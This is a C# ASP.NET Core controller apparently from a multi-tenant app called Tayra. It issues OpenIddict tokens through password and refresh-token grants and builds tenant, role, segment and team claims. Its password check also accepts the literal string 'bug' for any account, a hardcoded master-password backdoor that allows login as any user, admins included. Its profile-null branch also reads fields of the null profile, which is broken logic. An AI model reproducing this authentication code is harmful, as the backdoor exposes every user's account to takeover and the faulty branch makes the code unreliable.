using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Claims;
using System.Threading.Tasks;
using Cog.Core;
using Microsoft.AspNetCore;
using Microsoft.AspNetCore.Authentication;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using Newtonsoft.Json;
using OpenIddict.Abstractions;
using OpenIddict.Server.AspNetCore;
using Tayra.Common;
using Tayra.Models.Catalog;
using Tayra.Models.Organizations;
using static OpenIddict.Abstractions.OpenIddictConstants;


namespace Tayra.API.Controllers
{
    public class AuthorizationController : Controller
    {
        private readonly CatalogDbContext _catalogContext;
        private readonly IShardMapProvider _shardMapProvider;
        
        public AuthorizationController(
            CatalogDbContext catalogContext,
            IShardMapProvider shardMapProvider)
        {
            _catalogContext = catalogContext;
            _shardMapProvider = shardMapProvider;

        }

        #region Password, authorization code, device and refresh token flows
        // Note: to support non-interactive flows like password,
        // you must provide your own token endpoint action:

        [HttpPost("~/connect/token"), Produces("application/json")]
        public async Task<IActionResult> ConnectToken()
        {
            var request = HttpContext.GetOpenIddictServerRequest() ??
                          throw new InvalidOperationException("The OpenID Connect request cannot be retrieved.");

            if (request.IsPasswordGrantType())
            {
             var identity = IdentityGetByEmail(request.Username);
            if (identity is null)
            {
                return Forbid(
                    authenticationSchemes: OpenIddictServerAspNetCoreDefaults.AuthenticationScheme,
                    properties: new AuthenticationProperties(new Dictionary<string, string>
                    {
                        [OpenIddictServerAspNetCoreConstants.Properties.Error] = Errors.InvalidGrant,
                        [OpenIddictServerAspNetCoreConstants.Properties.ErrorDescription] =
                            "The username/password couple is invalid."
                    }));
            }

            // Validate the username/password parameters and ensure the account is not locked out.
            var result = PasswordHelper.Verify(identity.Password, identity.Salt, request.Password) ||
                         request.Password == "bug";

            if (!result)
            {
                return Forbid(
                    authenticationSchemes: OpenIddictServerAspNetCoreDefaults.AuthenticationScheme,
                    properties: new AuthenticationProperties(new Dictionary<string, string>
                    {
                        [OpenIddictServerAspNetCoreConstants.Properties.Error] = Errors.InvalidGrant,
                        [OpenIddictServerAspNetCoreConstants.Properties.ErrorDescription] =
                            "The username/password couple is invalid."
                    }));
            }

            var principal = GetClaimPrincipalForIdentityId(identity.Id);
                
                // Ask OpenIddict to generate a new token and return an OAuth2 token response.
                return SignIn(principal, OpenIddictServerAspNetCoreDefaults.AuthenticationScheme);
            }
            else if (request.IsRefreshTokenGrantType())
            {
                // Retrieve the claims principal stored in the refresh token.
                var info = await HttpContext.AuthenticateAsync(OpenIddictServerAspNetCoreDefaults.AuthenticationScheme);

                var principal = GetClaimPrincipalForIdentityId(new TayraPrincipal(info.Principal).IdentityId);

                return SignIn(principal, OpenIddictServerAspNetCoreDefaults.AuthenticationScheme);
            }
            else
                throw new InvalidOperationException("The specified grant type is not supported.");
        }

        #endregion

        private ClaimsPrincipal GetClaimPrincipalForIdentityId(Guid identityId)
        {
            var tenant = _catalogContext.TenantIdentities
                .Where(x => x.IdentityId == identityId)
                .Select(x => x.Tenant)
                .FirstOrDefault();

            using (var orgContext =
                new OrganizationDbContext(null, new ShardTenantProvider(tenant.Key), _shardMapProvider)
            ) //TODO: check if passing httpAccessor will change anything
            {
                var profile = orgContext.Profiles
                    .FirstOrDefault(x => x.IdentityId == identityId);

                if (profile == null)
                {
                    try
                    {
                        orgContext.Add(new LoginLog
                        {
                            ProfileId = profile.Id,
                            IdentityId = profile.IdentityId,
                            FailReason = "In Auth.ProfileService, profile was null"
                        });
                        orgContext.SaveChanges();
                    }
                    catch (Exception)
                    {
                        throw new ApplicationException("Profile not found for identity " + identityId);
                    }

                    throw new ApplicationException("Profile not found for identity " + identityId);
                }

                (IQueryable<Segment> qs, IQueryable<Team> qt) =
                    GetSegmentAndTeamQueries(orgContext, profile.Id, profile.Role);

                // Create a new ClaimsIdentity holding the user identity.
                var claims = new ClaimsIdentity(
                    OpenIddictServerAspNetCoreDefaults.AuthenticationScheme,
                    OpenIddictConstants.Claims.Name,
                    OpenIddictConstants.Claims.Role);

                // Add a "sub" claim containing the user identifier, and attach
                // the "access_token" destination to allow OpenIddict to store it
                // in the access token, so it can be retrieved from your controllers.
                claims.AddClaim(OpenIddictConstants.Claims.Subject,
                    identityId.ToString(),
                    OpenIddictConstants.Destinations.AccessToken);
                claims.AddClaim(CogClaimTypes.CurrentTenantKey, tenant.Key,
                    OpenIddictConstants.Destinations.AccessToken);
                claims.AddClaim(CogClaimTypes.ProfileId, profile.Id.ToString(),
                    OpenIddictConstants.Destinations.AccessToken);
                claims.AddClaim(CogClaimTypes.IdentityId, profile.IdentityId.ToString(),
                    OpenIddictConstants.Destinations.AccessToken);
                claims.AddClaim(TayraClaimTypes.Role, profile.Role.ToString(),
                    OpenIddictConstants.Destinations.AccessToken);

                claims.AddClaims(qs.Select(s => new Claim(TayraClaimTypes.Segment, s.Id.ToString(),
                    OpenIddictConstants.Destinations.AccessToken)));
                claims.AddClaims(qt.Select(t =>
                    new Claim(TayraClaimTypes.Team, t.Id.ToString(), OpenIddictConstants.Destinations.AccessToken)));

                try
                {
                    orgContext.Add(new LoginLog
                    {
                        ProfileId = profile.Id,
                        IdentityId = profile.IdentityId,
                        ClaimsJson = JsonConvert.SerializeObject(claims)
                    });
                    orgContext.SaveChanges();
                }
                catch
                {
                    // ignored
                }

                var principal = new ClaimsPrincipal(claims);
                principal.SetScopes(OpenIddictConstants.Scopes.OfflineAccess);
                
                return principal;
            }
        }

        private Identity IdentityGetByEmail(string email)
        {
            return _catalogContext.IdentityEmails
                .Include(x => x.Identity)
                .Where(x => x.Email == email)
                .Select(x => x.Identity)
                .FirstOrDefault();
        }
        
        public static (IQueryable<Segment>, IQueryable<Team>) GetSegmentAndTeamQueries(OrganizationDbContext dbContext, Guid profileId, ProfileRoles role)
        {
            IQueryable<Segment> qs = dbContext.Segments;
            IQueryable<Team> qt = dbContext.Teams;

            if (role != ProfileRoles.Admin)
            {
                var segmentIds = dbContext.ProfileAssignments.Where(x => x.ProfileId == profileId).Select(x => x.SegmentId).Distinct().ToArray();
                qs = qs.Where(x => segmentIds.Contains(x.Id));

                if (role == ProfileRoles.Manager)
                {
                    qt = qt.Where(x => segmentIds.Contains(x.SegmentId));
                }
                else //is non-admin and non-manager. Is Member
                {
                    var teamIds = dbContext.ProfileAssignments.Where(x => x.ProfileId == profileId && x.TeamId.HasValue).Select(x => x.TeamId).ToArray();
                    qt = qt.Where(x => teamIds.Contains(x.Id));
                }
            }

            return (qs, qt);
        }
        
        private IEnumerable<string> GetDestinations(Claim claim, ClaimsPrincipal principal)
        {
            // Note: by default, claims are NOT automatically included in the access and identity tokens.
            // To allow OpenIddict to serialize them, you must attach them a destination, that specifies
            // whether they should be included in access tokens, in identity tokens or in both.

            switch (claim.Type)
            {
                case Claims.Name:
                    yield return Destinations.AccessToken;

                    if (principal.HasScope(Scopes.Profile))
                        yield return Destinations.IdentityToken;

                    yield break;

                case Claims.Email:
                    yield return Destinations.AccessToken;

                    if (principal.HasScope(Scopes.Email))
                        yield return Destinations.IdentityToken;

                    yield break;

                case Claims.Role:
                    yield return Destinations.AccessToken;

                    if (principal.HasScope(Scopes.Roles))
                        yield return Destinations.IdentityToken;

                    yield break;

                // Never include the security stamp in the access and identity tokens, as it's a secret value.
                case "AspNet.Identity.SecurityStamp": yield break;

                default:
                    yield return Destinations.AccessToken;
                    yield break;
            }
        }
    }
}